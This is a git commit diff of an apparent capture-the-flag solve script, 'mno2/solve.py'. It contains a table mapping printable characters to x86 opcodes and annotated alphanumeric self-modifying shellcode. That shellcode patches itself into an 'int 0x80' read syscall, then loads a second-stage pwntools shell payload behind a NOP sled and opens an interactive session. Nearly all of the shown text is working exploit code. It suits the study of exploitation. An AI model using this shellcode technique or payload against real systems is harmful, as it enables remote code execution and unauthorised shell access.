ac36325ddb4e96e1d1ebde723527c42052efb73d
ngtuonghung <hungtuong05@gmail.com>
2026-02-24 18:04:06 +0700

    ok

--- mno2/solve.py
+++ mno2/solve.py
@@ -83,70 +83,92 @@ filtered = {
     "Y": ["", "b"],
     "Z": ["n", "r"],
 }
+
 '''
-| Char | Hex       | Instruction                                                              |
-| ---- | --------- | ------------------------------------------------------------------------ |
-| 0–3  | 0x30–0x33 | xor r/m8,r8 / xor r/m32,r32 / xor r8,r/m8 /                 |
-| 4    | 0x34      | xor al, imm8                                                             |
-| 5    | 0x35      | xor eax, imm32                                                           |
-| 8–9  | 0x38–0x39 | cmp r/m8,r8 / cmp r/m32,r32                                              |
-| A    | 0x41      | inc ecx                                                                  |
-| B    | 0x42      | inc edx                                                                  |
-| C    | 0x43      | inc ebx                                                                  |
-| D    | 0x44      | inc esp                                                                  |
-| E    | 0x45      | inc ebp                                                                  |
-| F    | 0x46      | inc esi                                                                  |
-| G    | 0x47      | inc edi                                                                  |
-| H    | 0x48      | dec eax                                                                  |
-| I    | 0x49      | dec ecx                                                                  |
-| K    | 0x4B      | dec ebx                                                                  |
-| L    | 0x4C      | dec esp                                                                  |
-| M    | 0x4D      | dec ebp                                                                  |
-| N    | 0x4E      | dec esi                                                                  |
-| O    | 0x4F      | dec edi                                                                  |
-| P    | 0x50      | push eax                                                                 |
-| R    | 0x52      | push edx                                                                 |
-| S    | 0x53      | push ebx                                                                 |
-| T    | 0x54      | push esp                                                                 |
-| U    | 0x55      | push ebp                                                                 |
-| V    | 0x56      | push esi                                                                 |
-| W    | 0x57      | push edi                                                                 |
-| X    | 0x58      | pop eax                                                                  |
-| Y    | 0x59      | pop ecx                                                                  |
-| Z    | 0x5A      | pop edx                                                                  |
-| a    | 0x61      | popad                                                                    |
-| b    | 0x62      | bound (2-byte, ModRM follows)                                            |
-| c    | 0x63      | arpl                                                                     |
-| d    | 0x64      | FS segment override prefix                                               |
-| e    | 0x65      | GS segment override prefix                                               |
-| f    | 0x66      | 16-bit operand size prefix                                               |
-| g    | 0x67      | 16-bit address size prefix                                               |
-| h    | 0x68      | push imm32                                                               |
-| i    | 0x69      | imul reg, r/m, imm32                                                     |
-| k    | 0x6B      | imul reg, r/m, imm8                                                      |
+| Char | Hex       | Instruction                  
+| ---- | --------- | -------------------------------------------
+| 0–3  | 0x30–0x33 | xor r/m8,r8 / xor r/m32,r32 / xor r8,r/m8 / xor r32,r/m32
+| 4    | 0x34      | xor al, imm8                 
+| 5    | 0x35      | xor eax, imm32               
+| 8–9  | 0x38–0x39 | cmp r/m8,r8 / cmp r/m32,r32  
+| A    | 0x41      | inc ecx                      
+| B    | 0x42      | inc edx                      
+| C    | 0x43      | inc ebx                      
+| D    | 0x44      | inc esp                      
+| E    | 0x45      | inc ebp                      
+| F    | 0x46      | inc esi                      
+| G    | 0x47      | inc edi                      
+| H    | 0x48      | dec eax                      
+| I    | 0x49      | dec ecx                      
+| K    | 0x4B      | dec ebx                      
+| L    | 0x4C      | dec esp                      
+| M    | 0x4D      | dec ebp                      
+| N    | 0x4E      | dec esi                      
+| O    | 0x4F      | dec edi                      
+| P    | 0x50      | push eax                     
+| R    | 0x52      | push edx                     
+| S    | 0x53      | push ebx                     
+| T    | 0x54      | push esp                     
+| U    | 0x55      | push ebp                     
+| V    | 0x56      | push esi                     
+| W    | 0x57      | push edi                     
+| X    | 0x58      | pop eax                      
+| Y    | 0x59      | pop ecx                      
+| Z    | 0x5A      | pop edx                      
+| a    | 0x61      | popad                        
+| b    | 0x62      | bound (2-byte, ModRM follows)
+| c    | 0x63      | arpl                         
+| d    | 0x64      | FS segment override prefix   
+| e    | 0x65      | GS segment override prefix   
+| f    | 0x66      | 16-bit operand size prefix   
+| g    | 0x67      | 16-bit address size prefix   
+| h    | 0x68      | push imm32                   
+| i    | 0x69      | imul reg, r/m, imm32         
+| k    | 0x6B      | imul reg, r/m, imm8          
 '''
 
-print("Reading more shellcode")
 shellcode = b""
+# sub ecx, 11 -> cl = 0xf5
 shellcode += b"I" * 11
-shellcode += b"1He"
+# xor dword ptr [eax + 0x65], ecx
+shellcode += b"1He" # 0x38 ^ 0xf5 = 0xcd
+# push 0x46464646; pop ecx -> cl = 0x46
 shellcode += b"BhFFFFY"
-shellcode += b'1Hf'
+# xor dword ptr [eax + 0x66], ecx
+shellcode += b'1Hf' # 0x39 ^ 0x46 ^ 0xff = 0x80
+# eax = 0x324f6e4d
+# push eax (x3)
 shellcode += b'PPP'
+# push 0x33333333
 shellcode += b"Bh3333"
+# pop eax; xor eax, 0x33333333 -> eax = 0
 shellcode += b'Xe53333'
+# push eax (x5); popad
 shellcode += b'PPPPPa'
+'''
+EDI -> 0
+ESI -> 0
+EBP -> 0
+ESP (discarded)
+EBX -> 0
+EDX -> 0x324f6e4d
+ECX -> 0x324f6e4d
+EAX -> 0x324f6e4d
+'''
+# push 0x33333334
 shellcode += b"Bh4333"
+# pop eax; xor eax, 0x33333337 -> eax = 3
 shellcode += b'Xe57333'
-
+# just padding
 shellcode = shellcode.ljust(101, b'F')
+# [eax + 0x65] = 0x38
+# [eax + 0x66] = 0x39
+# -> int 0x80
 shellcode += b'89'
 
 sl(p, shellcode)
 
 sleep(1)
-print("Spawn shell")
 
 s(p, b'\x90' * 0x67 + asm(shellcraft.sh()))
-
 ia(p)
